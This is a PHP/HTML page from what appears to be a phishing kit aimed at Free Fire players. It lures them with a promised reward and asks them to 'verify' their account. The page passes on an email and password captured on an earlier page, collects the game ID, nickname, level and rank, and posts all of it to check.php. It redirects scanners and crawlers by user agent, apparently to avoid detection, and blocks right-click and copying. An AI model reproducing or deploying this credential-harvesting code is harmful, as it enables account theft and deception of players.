<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
//MENGAMBIL SISTEM SCRIPT
include 'fsystem/setting.php';

//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style>
::placeholder {
color: #000;
}
</style>

<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Verifikasi Akun FREE FIRE Anda Untuk Menerima Hadiah Ini</div>
</div> <!--- menu-notify --->

<form action="check.php" method="post">
<center>
<input type="hidden" class="input-verify" name="email" id="email" value="<?php echo $email;?>" readonly>
<input type="hidden" class="input-verify" name="password" id="password" value="<?php echo $password;?>" readonly>
<input type="text" class="input-verify br-top" name="nick" id="nick" placeholder="Nickname" autocomplete="off" required>
<input type="number" class="input-verify br-line-top-none" name="playid" id="playid" placeholder="ID Game" autocomplete="off" required>
<select class="select-verify br-line-top-none" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Level Akun</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select class="select-verify br-line-top-none" name="tier" id="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked Level</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Master</option>
</select>
<select class="select-verify br-line-top-none" name="rpt" id="rpt" required>
<option selected="selected" disabled="disabled" value="">Pernah Elitepass?</option>
<option>Pernah</option>
<option>Tidak Pernah</option>
</select>
<input type="hidden" class="input-verify" name="login" id="login" value="<?php echo $login;?>" readonly>
</center>
<button type="submit" class="btn-verify">
<div class="btn-verify-icon">
<i class="zmdi zmdi-account-circle"></i>
</div>
Verifikasi Akun Saya
</button>
</form>
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->

</body>
</html>
